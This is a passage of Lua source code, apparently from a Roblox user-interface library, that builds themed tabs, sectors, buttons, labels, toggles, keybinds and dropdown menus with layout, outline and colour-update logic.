		tab.RightListLayout.Padding = UDim.new(0, 12)

		tab.RightListPadding = Instance.new(""UIPadding"", tab.Right)
		tab.RightListPadding.PaddingTop = UDim.new(0, 12)
		tab.RightListPadding.PaddingLeft = UDim.new(0, 6)
		tab.RightListPadding.PaddingRight = UDim.new(0, 12)

		local block = false
		function tab:SelectTab()
			repeat wait() until not block

			block = true
			for i, v in pairs(window.Tabs) do
				if v ~= tab then
					v.TabButton.TextColor3 = Color3.fromRGB(230, 230, 230)
					v.TabButton.Name = ""Tab""
					v.Left.Visible = false
					v.Right.Visible = false
				end
			end

			tab.TabButton.TextColor3 = window.theme.accentcolor
			tab.TabButton.Name = ""SelectedTab""
			tab.Right.Visible = true
			tab.Left.Visible = true
			window.Line:TweenSizeAndPosition(UDim2.fromOffset(size.X + 15, 1), UDim2.new(0, (tab.TabButton.AbsolutePosition.X - window.Frame.AbsolutePosition.X), 0, 0) + (window.BlackLine.Position - UDim2.fromOffset(0, 1)), Enum.EasingDirection.In, Enum.EasingStyle.Sine, 0.15)
			wait(0.2)
			block = false
		end

		if #window.Tabs == 0 then
			tab:SelectTab()
		end

		tab.TabButton.MouseButton1Down:Connect(function()
			tab:SelectTab()
		end)

		tab.SectorsLeft = {}
		tab.SectorsRight = {}

		function tab:CreateSector(name, side)
			local sector = {}
			sector.name = name or """"
			sector.side = side:lower() or ""left""

			sector.Main = Instance.new(""Frame"", sector.side == ""left"" and tab.Left or tab.Right)
			sector.Main.Name = sector.name:gsub("" "", """") .. ""Sector""
			sector.Main.BorderSizePixel = 0
			sector.Main.ZIndex = 4
			sector.Main.Size = UDim2.fromOffset(window.size.X.Offset / 2 - 17, 20)
			sector.Main.BackgroundColor3 = window.theme.sectorcolor
			updateevent.Event:Connect(function(theme)
				sector.Main.BackgroundColor3 = theme.sectorcolor
			end)

			sector.Line = Instance.new(""Frame"", sector.Main)
			sector.Line.Name = ""line""
			sector.Line.ZIndex = 4
			sector.Line.Size = UDim2.fromOffset(sector.Main.Size.X.Offset + 4, 1)
			sector.Line.BorderSizePixel = 0
			sector.Line.Position = UDim2.fromOffset(- 2, - 2)
			sector.Line.BackgroundColor3 = window.theme.accentcolor
			updateevent.Event:Connect(function(theme)
				sector.Line.BackgroundColor3 = theme.accentcolor
			end)

			sector.BlackOutline = Instance.new(""Frame"", sector.Main)
			sector.BlackOutline.Name = ""outline""
			sector.BlackOutline.ZIndex = 3
			sector.BlackOutline.Size = sector.Main.Size + UDim2.fromOffset(2, 2)
			sector.BlackOutline.BorderSizePixel = 0
			sector.BlackOutline.BackgroundColor3 = window.theme.outlinecolor2
			sector.BlackOutline.Position = UDim2.fromOffset(- 1, - 1)
			sector.Main:GetPropertyChangedSignal(""Size""):Connect(function()
				sector.BlackOutline.Size = sector.Main.Size + UDim2.fromOffset(2, 2)
			end)
			updateevent.Event:Connect(function(theme)
				sector.BlackOutline.BackgroundColor3 = theme.outlinecolor2
			end)


			sector.Outline = Instance.new(""Frame"", sector.Main)
			sector.Outline.Name = ""outline""
			sector.Outline.ZIndex = 2
			sector.Outline.Size = sector.Main.Size + UDim2.fromOffset(4, 4)
			sector.Outline.BorderSizePixel = 0
			sector.Outline.BackgroundColor3 = window.theme.outlinecolor
			sector.Outline.Position = UDim2.fromOffset(- 2, - 2)
			sector.Main:GetPropertyChangedSignal(""Size""):Connect(function()
				sector.Outline.Size = sector.Main.Size + UDim2.fromOffset(4, 4)
			end)
			updateevent.Event:Connect(function(theme)
				sector.Outline.BackgroundColor3 = theme.outlinecolor
			end)

			sector.BlackOutline2 = Instance.new(""Frame"", sector.Main)
			sector.BlackOutline2.Name = ""outline""
			sector.BlackOutline2.ZIndex = 1
			sector.BlackOutline2.Size = sector.Main.Size + UDim2.fromOffset(6, 6)
			sector.BlackOutline2.BorderSizePixel = 0
			sector.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
			sector.BlackOutline2.Position = UDim2.fromOffset(- 3, - 3)
			sector.Main:GetPropertyChangedSignal(""Size""):Connect(function()
				sector.BlackOutline2.Size = sector.Main.Size + UDim2.fromOffset(6, 6)
			end)
			updateevent.Event:Connect(function(theme)
				sector.BlackOutline2.BackgroundColor3 = theme.outlinecolor2
			end)

			local size = textservice:GetTextSize(sector.name, 15, window.theme.font, Vector2.new(2000, 2000))
			sector.Label = Instance.new(""TextLabel"", sector.Main)
			sector.Label.AnchorPoint = Vector2.new(0, 0.5)
			sector.Label.Position = UDim2.fromOffset(12, - 1)
			sector.Label.Size = UDim2.fromOffset(math.clamp(textservice:GetTextSize(sector.name, 15, window.theme.font, Vector2.new(200, 300)).X + 13, 0, sector.Main.Size.X.Offset), size.Y)
			sector.Label.BackgroundTransparency = 1
			sector.Label.BorderSizePixel = 0
			sector.Label.ZIndex = 6
			sector.Label.Text = sector.name
			sector.Label.TextColor3 = Color3.new(1, 1, 2552 / 255)
			sector.Label.TextStrokeTransparency = 1
			sector.Label.Font = window.theme.font
			sector.Label.TextSize = 15
			updateevent.Event:Connect(function(theme)
				local size = textservice:GetTextSize(sector.name, 15, theme.font, Vector2.new(2000, 2000))
				sector.Label.Size = UDim2.fromOffset(math.clamp(textservice:GetTextSize(sector.name, 15, theme.font, Vector2.new(200, 300)).X + 13, 0, sector.Main.Size.X.Offset), size.Y)
				sector.Label.Font = theme.font
			end)

			sector.LabelBackFrame = Instance.new(""Frame"", sector.Main)
			sector.LabelBackFrame.Name = ""labelframe""
			sector.LabelBackFrame.ZIndex = 5
			sector.LabelBackFrame.Size = UDim2.fromOffset(sector.Label.Size.X.Offset, 10)
			sector.LabelBackFrame.BorderSizePixel = 0
			sector.LabelBackFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
			sector.LabelBackFrame.Position = UDim2.fromOffset(sector.Label.Position.X.Offset, sector.BlackOutline2.Position.Y.Offset)

			sector.Items = Instance.new(""Frame"", sector.Main)
			sector.Items.Name = ""items""
			sector.Items.ZIndex = 2
			sector.Items.BackgroundTransparency = 1
			sector.Items.Size = UDim2.fromOffset(170, 140)
			sector.Items.AutomaticSize = Enum.AutomaticSize.Y
			sector.Items.BorderSizePixel = 0

			sector.ListLayout = Instance.new(""UIListLayout"", sector.Items)
			sector.ListLayout.FillDirection = Enum.FillDirection.Vertical
			sector.ListLayout.SortOrder = Enum.SortOrder.LayoutOrder
			sector.ListLayout.Padding = UDim.new(0, 12)

			sector.ListPadding = Instance.new(""UIPadding"", sector.Items)
			sector.ListPadding.PaddingTop = UDim.new(0, 15)
			sector.ListPadding.PaddingLeft = UDim.new(0, 6)
			sector.ListPadding.PaddingRight = UDim.new(0, 6)

			table.insert(sector.side:lower() == ""left"" and tab.SectorsLeft or tab.SectorsRight, sector)

			function sector:FixSize()
				sector.Main.Size = UDim2.fromOffset(window.size.X.Offset / 2 - 17, sector.ListLayout.AbsoluteContentSize.Y + 22)
				local sizeleft, sizeright = 0, 0
				for i, v in pairs(tab.SectorsLeft) do
					sizeleft = sizeleft + v.Main.AbsoluteSize.Y
				end
				for i, v in pairs(tab.SectorsRight) do
					sizeright = sizeright + v.Main.AbsoluteSize.Y
				end

				tab.Left.CanvasSize = UDim2.fromOffset(tab.Left.AbsoluteSize.X, sizeleft + ((#tab.SectorsLeft - 1) * tab.LeftListPadding.PaddingTop.Offset) + 20)
				tab.Right.CanvasSize = UDim2.fromOffset(tab.Right.AbsoluteSize.X, sizeright + ((#tab.SectorsRight - 1) * tab.RightListPadding.PaddingTop.Offset) + 20)
			end

			function sector:AddButton(text, callback)
				local button = {}
				button.text = text or """"
				button.callback = callback or function() end

				button.Main = Instance.new(""TextButton"", sector.Items)
				button.Main.BorderSizePixel = 0
				button.Main.Text = """"
				button.Main.AutoButtonColor = false
				button.Main.Name = ""button""
				button.Main.ZIndex = 5
				button.Main.Size = UDim2.fromOffset(sector.Main.Size.X.Offset - 12, 14)
				button.Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

				button.Gradient = Instance.new(""UIGradient"", button.Main)
				button.Gradient.Rotation = 90
				button.Gradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, window.theme.buttoncolor), ColorSequenceKeypoint.new(1, window.theme.buttoncolor2)})
				updateevent.Event:Connect(function(theme)
					button.Gradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, theme.buttoncolor), ColorSequenceKeypoint.new(1, theme.buttoncolor2)})
				end)

				button.BlackOutline2 = Instance.new(""Frame"", button.Main)
				button.BlackOutline2.Name = ""blackline""
				button.BlackOutline2.ZIndex = 4
				button.BlackOutline2.Size = button.Main.Size + UDim2.fromOffset(6, 6)
				button.BlackOutline2.BorderSizePixel = 0
				button.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
				button.BlackOutline2.Position = UDim2.fromOffset(- 3, - 3)
				updateevent.Event:Connect(function(theme)
					button.BlackOutline2.BackgroundColor3 = theme.outlinecolor2
				end)

				button.Outline = Instance.new(""Frame"", button.Main)
				button.Outline.Name = ""blackline""
				button.Outline.ZIndex = 4
				button.Outline.Size = button.Main.Size + UDim2.fromOffset(4, 4)
				button.Outline.BorderSizePixel = 0
				button.Outline.BackgroundColor3 = window.theme.outlinecolor
				button.Outline.Position = UDim2.fromOffset(- 2, - 2)
				updateevent.Event:Connect(function(theme)
					button.Outline.BackgroundColor3 = theme.outlinecolor
				end)

				button.BlackOutline = Instance.new(""Frame"", button.Main)
				button.BlackOutline.Name = ""blackline""
				button.BlackOutline.ZIndex = 4
				button.BlackOutline.Size = button.Main.Size + UDim2.fromOffset(2, 2)
				button.BlackOutline.BorderSizePixel = 0
				button.BlackOutline.BackgroundColor3 = window.theme.outlinecolor2
				button.BlackOutline.Position = UDim2.fromOffset(- 1, - 1)
				updateevent.Event:Connect(function(theme)
					button.BlackOutline.BackgroundColor3 = theme.outlinecolor2
				end)

				button.Label = Instance.new(""TextLabel"", button.Main)
				button.Label.Name = ""Label""
				button.Label.BackgroundTransparency = 1
				button.Label.Position = UDim2.new(0, - 1, 0, 0)
				button.Label.ZIndex = 5
				button.Label.Size = button.Main.Size
				button.Label.Font = window.theme.font
				button.Label.Text = button.text
				button.Label.TextColor3 = window.theme.itemscolor2
				button.Label.TextSize = 15
				button.Label.TextStrokeTransparency = 1
				button.Label.TextXAlignment = Enum.TextXAlignment.Center
				button.Main.MouseButton1Down:Connect(button.callback)
				updateevent.Event:Connect(function(theme)
					button.Label.Font = theme.font
					button.Label.TextColor3 = theme.itemscolor
				end)

				button.BlackOutline2.MouseEnter:Connect(function()
					button.BlackOutline2.BackgroundColor3 = window.theme.accentcolor
				end)

				button.BlackOutline2.MouseLeave:Connect(function()
					button.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
				end)

				sector:FixSize()

				return button
			end

			function sector:AddLabel(text)
				local label = {}

				label.Main = Instance.new(""TextLabel"", sector.Items)
				label.Main.Name = ""Label""
				label.Main.BackgroundTransparency = 1
				label.Main.Position = UDim2.new(0, - 1, 0, 0)
				label.Main.ZIndex = 4
				label.Main.AutomaticSize = Enum.AutomaticSize.XY
				label.Main.Font = window.theme.font
				label.Main.Text = text
				label.Main.TextColor3 = window.theme.itemscolor
				label.Main.TextSize = 15
				label.Main.TextStrokeTransparency = 1
				label.Main.TextXAlignment = Enum.TextXAlignment.Left
				updateevent.Event:Connect(function(theme)
					label.Main.Font = theme.font
					label.Main.TextColor3 = theme.itemscolor
				end)

				function label:Set(value)
					label.Main.Text = value
				end

				sector:FixSize()

				return label
			end

			function sector:AddToggle(text, default, callback, flag)
				local toggle = {}
				toggle.text = text or """"
				toggle.default = default or false
				toggle.callback = callback or function(value) end
				toggle.flag = flag or text or """"

				toggle.value = toggle.default

				toggle.Main = Instance.new(""TextButton"", sector.Items)
				toggle.Main.Name = ""toggle""
				toggle.Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				toggle.Main.BorderColor3 = window.theme.outlinecolor
				toggle.Main.BorderSizePixel = 0
				toggle.Main.Size = UDim2.fromOffset(8, 8)
				toggle.Main.AutoButtonColor = false
				toggle.Main.ZIndex = 5
				toggle.Main.Font = Enum.Font.SourceSans
				toggle.Main.Text = """"
				toggle.Main.TextColor3 = Color3.fromRGB(0, 0, 0)
				toggle.Main.TextSize = 15
				updateevent.Event:Connect(function(theme)
					toggle.Main.BorderColor3 = theme.outlinecolor
				end)

				toggle.BlackOutline2 = Instance.new(""Frame"", toggle.Main)
				toggle.BlackOutline2.Name = ""blackline""
				toggle.BlackOutline2.ZIndex = 4
				toggle.BlackOutline2.Size = toggle.Main.Size + UDim2.fromOffset(6, 6)
				toggle.BlackOutline2.BorderSizePixel = 0
				toggle.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
				toggle.BlackOutline2.Position = UDim2.fromOffset(- 3, - 3)
				updateevent.Event:Connect(function(theme)
					toggle.BlackOutline2.BackgroundColor3 = theme.outlinecolor2
				end)

				toggle.Outline = Instance.new(""Frame"", toggle.Main)
				toggle.Outline.Name = ""blackline""
				toggle.Outline.ZIndex = 4
				toggle.Outline.Size = toggle.Main.Size + UDim2.fromOffset(4, 4)
				toggle.Outline.BorderSizePixel = 0
				toggle.Outline.BackgroundColor3 = window.theme.outlinecolor
				toggle.Outline.Position = UDim2.fromOffset(- 2, - 2)
				updateevent.Event:Connect(function(theme)
					toggle.Outline.BackgroundColor3 = theme.outlinecolor
				end)

				toggle.BlackOutline = Instance.new(""Frame"", toggle.Main)
				toggle.BlackOutline.Name = ""blackline""
				toggle.BlackOutline.ZIndex = 4
				toggle.BlackOutline.Size = toggle.Main.Size + UDim2.fromOffset(2, 2)
				toggle.BlackOutline.BorderSizePixel = 0
				toggle.BlackOutline.BackgroundColor3 = window.theme.outlinecolor2
				toggle.BlackOutline.Position = UDim2.fromOffset(- 1, - 1)
				updateevent.Event:Connect(function(theme)
					toggle.BlackOutline.BackgroundColor3 = theme.outlinecolor2
				end)

				toggle.Gradient = Instance.new(""UIGradient"", toggle.Main)
				toggle.Gradient.Rotation = (22.5 * 13)
				toggle.Gradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 30, 30)), ColorSequenceKeypoint.new(1, Color3.fromRGB(45, 45, 45))})

				toggle.Label = Instance.new(""TextButton"", toggle.Main)
				toggle.Label.Name = ""Label""
				toggle.Label.AutoButtonColor = false
				toggle.Label.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				toggle.Label.BackgroundTransparency = 1
				toggle.Label.Position = UDim2.fromOffset(toggle.Main.AbsoluteSize.X + 10, - 2)
				toggle.Label.Size = UDim2.fromOffset(sector.Main.Size.X.Offset - 71, toggle.BlackOutline.Size.Y.Offset)
				toggle.Label.Font = window.theme.font
				toggle.Label.ZIndex = 5
				toggle.Label.Text = toggle.text
				toggle.Label.TextColor3 = window.theme.itemscolor
				toggle.Label.TextSize = 15
				toggle.Label.TextStrokeTransparency = 1
				toggle.Label.TextXAlignment = Enum.TextXAlignment.Left
				updateevent.Event:Connect(function(theme)
					toggle.Label.Font = theme.font
					toggle.Label.TextColor3 = toggle.value and window.theme.itemscolor2 or theme.itemscolor
				end)

				toggle.CheckedFrame = Instance.new(""Frame"", toggle.Main)
				toggle.CheckedFrame.ZIndex = 5
				toggle.CheckedFrame.BorderSizePixel = 0
				toggle.CheckedFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				toggle.CheckedFrame.Size = toggle.Main.Size

				toggle.Gradient2 = Instance.new(""UIGradient"", toggle.CheckedFrame)
				toggle.Gradient2.Rotation = (22.5 * 13)
				toggle.Gradient2.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, window.theme.accentcolor2), ColorSequenceKeypoint.new(1, window.theme.accentcolor)})
				updateevent.Event:Connect(function(theme)
					toggle.Gradient2.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, theme.accentcolor2), ColorSequenceKeypoint.new(1, theme.accentcolor)})
				end)

				toggle.Items = Instance.new(""Frame"", toggle.Main)
				toggle.Items.Name = ""\n""
				toggle.Items.ZIndex = 4
				toggle.Items.Size = UDim2.fromOffset(60, toggle.BlackOutline.AbsoluteSize.Y)
				toggle.Items.BorderSizePixel = 0
				toggle.Items.BackgroundTransparency = 1
				toggle.Items.BackgroundColor3 = Color3.new(0, 0, 0)
				toggle.Items.Position = UDim2.fromOffset(sector.Main.Size.X.Offset - 71, 0)

				toggle.ListLayout = Instance.new(""UIListLayout"", toggle.Items)
				toggle.ListLayout.FillDirection = Enum.FillDirection.Horizontal
				toggle.ListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Right
				toggle.ListLayout.SortOrder = Enum.SortOrder.LayoutOrder
				toggle.ListLayout.Padding = UDim.new(0.04, 6)

				if toggle.flag and toggle.flag ~= """" then
					library.flags[toggle.flag] = toggle.default or false
				end

				function toggle:Set(value)
					if value then
						toggle.Label.TextColor3 = window.theme.itemscolor2
					else
						toggle.Label.TextColor3 = window.theme.itemscolor
					end

					toggle.value = value
					toggle.CheckedFrame.Visible = value
					if toggle.flag and toggle.flag ~= """" then
						library.flags[toggle.flag] = toggle.value
					end
					pcall(toggle.callback, value)
				end

				function toggle:Get()
					return toggle.value
				end

				toggle:Set(toggle.default)

				function toggle:AddKeybind(default, flag)
					local keybind = {}

					keybind.default = default or ""None""
					keybind.value = keybind.default
					keybind.flag = flag or ((toggle.text or """") .. #toggle.Items:GetChildren())

					local shorter_keycodes = {
						[""LeftShift""] = ""LSHIFT"", 
						[""RightShift""] = ""RSHIFT"", 
						[""LeftControl""] = ""LCTRL"", 
						[""RightControl""] = ""RCTRL"", 
						[""LeftAlt""] = ""LALT"", 
						[""RightAlt""] = ""RALT""
					}

					local text = keybind.default == ""None"" and ""[None]"" or ""["" .. (shorter_keycodes[keybind.default.Name] or keybind.default.Name) .. ""]""
					local size = textservice:GetTextSize(text, 15, window.theme.font, Vector2.new(2000, 2000))

					keybind.Main = Instance.new(""TextButton"", toggle.Items)
					keybind.Main.Name = ""keybind""
					keybind.Main.BackgroundTransparency = 1
					keybind.Main.BorderSizePixel = 0
					keybind.Main.ZIndex = 5
					keybind.Main.Size = UDim2.fromOffset(size.X + 2, size.Y - 7)
					keybind.Main.Text = text
					keybind.Main.Font = window.theme.font
					keybind.Main.TextColor3 = Color3.fromRGB(136, 136, 136)
					keybind.Main.TextSize = 15
					keybind.Main.TextXAlignment = Enum.TextXAlignment.Right
					keybind.Main.MouseButton1Down:Connect(function()
						keybind.Main.Text = ""[...]""
						keybind.Main.TextColor3 = window.theme.accentcolor
					end)
					updateevent.Event:Connect(function(theme)
						keybind.Main.Font = theme.font
						if keybind.Main.Text == ""[...]"" then
							keybind.Main.TextColor3 = theme.accentcolor
						else
							keybind.Main.TextColor3 = Color3.fromRGB(136, 136, 136)
						end
					end)

					if keybind.flag and keybind.flag ~= """" then
						library.flags[keybind.flag] = keybind.default
					end
					function keybind:Set(key)
						if key == ""None"" then
							keybind.Main.Text = ""["" .. key .. ""]""
							keybind.value = key
							if keybind.flag and keybind.flag ~= """" then
								library.flags[keybind.flag] = key
							end
						end
						keybind.Main.Text = ""["" .. (shorter_keycodes[key.Name] or key.Name) .. ""]""
						keybind.value = key
						if keybind.flag and keybind.flag ~= """" then
							library.flags[keybind.flag] = keybind.value
						end
					end

					function keybind:Get()
						return keybind.value
					end

					uis.InputBegan:Connect(function(input, gameProcessed)
						if not gameProcessed then
							if keybind.Main.Text == ""[...]"" then
								keybind.Main.TextColor3 = Color3.fromRGB(136, 136, 136)
								if input.UserInputType == Enum.UserInputType.Keyboard then
									keybind:Set(input.KeyCode)
								else
									keybind:Set(""None"")
								end
							else
								if keybind.value ~= ""None"" and input.KeyCode == keybind.value then
									toggle:Set(not toggle.CheckedFrame.Visible)
								end
							end
						end
					end)

					table.insert(library.items, keybind)

					return keybind
				end

				function toggle:AddDropdown(items, default, multichoice, callback, flag)
					local dropdown = {}

					dropdown.defaultitems = items or {}
					dropdown.default = default
					dropdown.callback = callback or function() end
					dropdown.multichoice = multichoice or false
					dropdown.values = {}
					dropdown.flag = flag or ((toggle.text or """") .. #sector.Items:GetChildren() .. ""a"")

					dropdown.Main = Instance.new(""TextButton"", sector.Items)
					dropdown.Main.Name = ""dropdown""
					dropdown.Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
					dropdown.Main.BorderSizePixel = 0
					dropdown.Main.Size = UDim2.fromOffset(sector.Main.Size.X.Offset - 12, 16)
					dropdown.Main.Position = UDim2.fromOffset(0, 0)
					dropdown.Main.ZIndex = 5
					dropdown.Main.AutoButtonColor = false
					dropdown.Main.Font = window.theme.font
					dropdown.Main.Text = """"
					dropdown.Main.TextColor3 = Color3.fromRGB(255, 255, 255)
					dropdown.Main.TextSize = 15
					dropdown.Main.TextXAlignment = Enum.TextXAlignment.Left
					updateevent.Event:Connect(function(theme)
						dropdown.Main.Font = theme.font
					end)

					dropdown.Gradient = Instance.new(""UIGradient"", dropdown.Main)
					dropdown.Gradient.Rotation = 90
					dropdown.Gradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(49, 49, 49)), ColorSequenceKeypoint.new(1, Color3.fromRGB(39, 39, 39))}

					dropdown.SelectedLabel = Instance.new(""TextLabel"", dropdown.Main)
					dropdown.SelectedLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
					dropdown.SelectedLabel.BackgroundTransparency = 1
					dropdown.SelectedLabel.Position = UDim2.fromOffset(5, 2)
					dropdown.SelectedLabel.Size = UDim2.fromOffset(130, 13)
					dropdown.SelectedLabel.Font = window.theme.font
					dropdown.SelectedLabel.Text = toggle.text
					dropdown.SelectedLabel.ZIndex = 5
					dropdown.SelectedLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
					dropdown.SelectedLabel.TextSize = 15
					dropdown.SelectedLabel.TextStrokeTransparency = 1
					dropdown.SelectedLabel.TextXAlignment = Enum.TextXAlignment.Left
					updateevent.Event:Connect(function(theme)
						dropdown.SelectedLabel.Font = theme.font
					end)

					dropdown.Nav = Instance.new(""ImageButton"", dropdown.Main)
					dropdown.Nav.Name = ""navigation""
					dropdown.Nav.BackgroundTransparency = 1
					dropdown.Nav.LayoutOrder = 10
					dropdown.Nav.Position = UDim2.fromOffset(sector.Main.Size.X.Offset - 26, 5)
					dropdown.Nav.Rotation = 90
					dropdown.Nav.ZIndex = 5
					dropdown.Nav.Size = UDim2.fromOffset(8, 8)
					dropdown.Nav.Image = ""rbxassetid://4918373417""
					dropdown.Nav.ImageColor3 = Color3.fromRGB(210, 210, 210)

					dropdown.BlackOutline2 = Instance.new(""Frame"", dropdown.Main)
					dropdown.BlackOutline2.Name = ""blackline""
					dropdown.BlackOutline2.ZIndex = 4
					dropdown.BlackOutline2.Size = dropdown.Main.Size + UDim2.fromOffset(6, 6)
					dropdown.BlackOutline2.BorderSizePixel = 0
					dropdown.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
					dropdown.BlackOutline2.Position = UDim2.fromOffset(- 3, - 3)
					updateevent.Event:Connect(function(theme)
						dropdown.BlackOutline2.BackgroundColor3 = theme.outlinecolor2
					end)

					dropdown.Outline = Instance.new(""Frame"", dropdown.Main)
					dropdown.Outline.Name = ""blackline""
					dropdown.Outline.ZIndex = 4
					dropdown.Outline.Size = dropdown.Main.Size + UDim2.fromOffset(4, 4)
					dropdown.Outline.BorderSizePixel = 0
					dropdown.Outline.BackgroundColor3 = window.theme.outlinecolor
					dropdown.Outline.Position = UDim2.fromOffset(- 2, - 2)
					updateevent.Event:Connect(function(theme)
						dropdown.Outline.BackgroundColor3 = theme.outlinecolor
					end)

					dropdown.BlackOutline = Instance.new(""Frame"", dropdown.Main)
					dropdown.BlackOutline.Name = ""blackline444""
					dropdown.BlackOutline.ZIndex = 4
					dropdown.BlackOutline.Size = dropdown.Main.Size + UDim2.fromOffset(2, 2)
					dropdown.BlackOutline.BorderSizePixel = 0
					dropdown.BlackOutline.BackgroundColor3 = window.theme.outlinecolor2
					dropdown.BlackOutline.Position = UDim2.fromOffset(- 1, - 1)
					updateevent.Event:Connect(function(theme)
						dropdown.BlackOutline.BackgroundColor3 = theme.outlinecolor2
					end)

					dropdown.ItemsFrame = Instance.new(""ScrollingFrame"", dropdown.Main)
					dropdown.ItemsFrame.Name = ""itemsframe""
					dropdown.ItemsFrame.BorderSizePixel = 0
					dropdown.ItemsFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
					dropdown.ItemsFrame.Position = UDim2.fromOffset(0, dropdown.Main.Size.Y.Offset + 8)
					dropdown.ItemsFrame.ScrollBarThickness = 2
					dropdown.ItemsFrame.ZIndex = 8
					dropdown.ItemsFrame.ScrollingDirection = ""Y""
					dropdown.ItemsFrame.Visible = false
					dropdown.ItemsFrame.Size = UDim2.new(0, 0, 0, 0)
					dropdown.ItemsFrame.CanvasSize = UDim2.fromOffset(dropdown.Main.AbsoluteSize.X, 0)

					dropdown.ListLayout = Instance.new(""UIListLayout"", dropdown.ItemsFrame)
					dropdown.ListLayout.FillDirection = Enum.FillDirection.Vertical
					dropdown.ListLayout.SortOrder = Enum.SortOrder.LayoutOrder

					dropdown.ListPadding = Instance.new(""UIPadding"", dropdown.ItemsFrame)
					dropdown.ListPadding.PaddingTop = UDim.new(0, 2)
					dropdown.ListPadding.PaddingBottom = UDim.new(0, 2)
					dropdown.ListPadding.PaddingLeft = UDim.new(0, 2)
					dropdown.ListPadding.PaddingRight = UDim.new(0, 2)

					dropdown.BlackOutline2Items = Instance.new(""Frame"", dropdown.Main)
					dropdown.BlackOutline2Items.Name = ""blackline3""
					dropdown.BlackOutline2Items.ZIndex = 7
					dropdown.BlackOutline2Items.Size = dropdown.ItemsFrame.Size + UDim2.fromOffset(6, 6)
					dropdown.BlackOutline2Items.BorderSizePixel = 0
					dropdown.BlackOutline2Items.BackgroundColor3 = window.theme.outlinecolor2
					dropdown.BlackOutline2Items.Position = dropdown.ItemsFrame.Position + UDim2.fromOffset(- 3, - 3)
					dropdown.BlackOutline2Items.Visible = false
					updateevent.Event:Connect(function(theme)
						dropdown.BlackOutline2Items.BackgroundColor3 = theme.outlinecolor2
					end)

					dropdown.OutlineItems = Instance.new(""Frame"", dropdown.Main)
					dropdown.OutlineItems.Name = ""blackline8""
					dropdown.OutlineItems.ZIndex = 7
					dropdown.OutlineItems.Size = dropdown.ItemsFrame.Size + UDim2.fromOffset(4, 4)
					dropdown.OutlineItems.BorderSizePixel = 0
					dropdown.OutlineItems.BackgroundColor3 = window.theme.outlinecolor
					dropdown.OutlineItems.Position = dropdown.ItemsFrame.Position + UDim2.fromOffset(- 2, - 2)
					dropdown.OutlineItems.Visible = false
					updateevent.Event:Connect(function(theme)
						dropdown.OutlineItems.BackgroundColor3 = theme.outlinecolor
					end)

					dropdown.BlackOutlineItems = Instance.new(""Frame"", dropdown.Main)
					dropdown.BlackOutlineItems.Name = ""blackline3""
					dropdown.BlackOutlineItems.ZIndex = 7
					dropdown.BlackOutlineItems.Size = dropdown.ItemsFrame.Size + UDim2.fromOffset(- 2, - 2)
					dropdown.BlackOutlineItems.BorderSizePixel = 0
					dropdown.BlackOutlineItems.BackgroundColor3 = window.theme.outlinecolor2
					dropdown.BlackOutlineItems.Position = dropdown.ItemsFrame.Position + UDim2.fromOffset(- 1, - 1)
					dropdown.BlackOutlineItems.Visible = false
					updateevent.Event:Connect(function(theme)
						dropdown.BlackOutlineItems.BackgroundColor3 = theme.outlinecolor2
					end)

					dropdown.IgnoreBackButtons = Instance.new(""TextButton"", dropdown.Main)
					dropdown.IgnoreBackButtons.BackgroundTransparency = 1
					dropdown.IgnoreBackButtons.BorderSizePixel = 0
					dropdown.IgnoreBackButtons.Position = UDim2.fromOffset(0, dropdown.Main.Size.Y.Offset + 8)
					dropdown.IgnoreBackButtons.Size = UDim2.new(0, 0, 0, 0)
					dropdown.IgnoreBackButtons.ZIndex = 7
					dropdown.IgnoreBackButtons.Text = """"
					dropdown.IgnoreBackButtons.Visible = false
					dropdown.IgnoreBackButtons.AutoButtonColor = false

					if dropdown.flag and dropdown.flag ~= """" then
						library.flags[dropdown.flag] = dropdown.multichoice and {dropdown.default or dropdown.defaultitems[1] or """"} or (dropdown.default or dropdown.defaultitems[1] or """")
					end

					function dropdown:isSelected(item)
						for i, v in pairs(dropdown.values) do
							if v == item then
								return true
							end
						end

						return false
					end

					function dropdown:updateText(text)
						if #text >= 27 then
							text = text:sub(1, 25) .. ""..""
						end
						dropdown.SelectedLabel.Text = text
					end

					dropdown.Changed = Instance.new(""BindableEvent"")
					function dropdown:Set(value)
						if type(value) == ""table"" then
							dropdown.values = value
							dropdown:updateText(table.concat(value, "", ""))
							pcall(dropdown.callback, value)
						else
							dropdown:updateText(value)
							dropdown.values = {value}
							pcall(dropdown.callback, value)
						end

						dropdown.Changed:Fire(value)
						if dropdown.flag and dropdown.flag ~= """" then
							library.flags[dropdown.flag] = dropdown.multichoice and dropdown.values or dropdown.values[1]
						end
					end

					function dropdown:Get()
						return dropdown.multichoice and dropdown.values or dropdown.values[1]
					end

					dropdown.items = {}
					function dropdown:Add(v)
						local Item = Instance.new(""TextButton"", dropdown.ItemsFrame)
						Item.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
						Item.TextColor3 = Color3.fromRGB(255, 255, 255)
						Item.BorderSizePixel = 0
						Item.Position = UDim2.fromOffset(0, 0)
						Item.Size = UDim2.fromOffset(dropdown.Main.Size.X.Offset - 4, 20)
						Item.ZIndex = 9
						Item.Text = v
						Item.Name = v
						Item.AutoButtonColor = false
						Item.Font = window.theme.font
						Item.TextSize = 15
						Item.TextXAlignment = Enum.TextXAlignment.Left
						Item.TextStrokeTransparency = 1
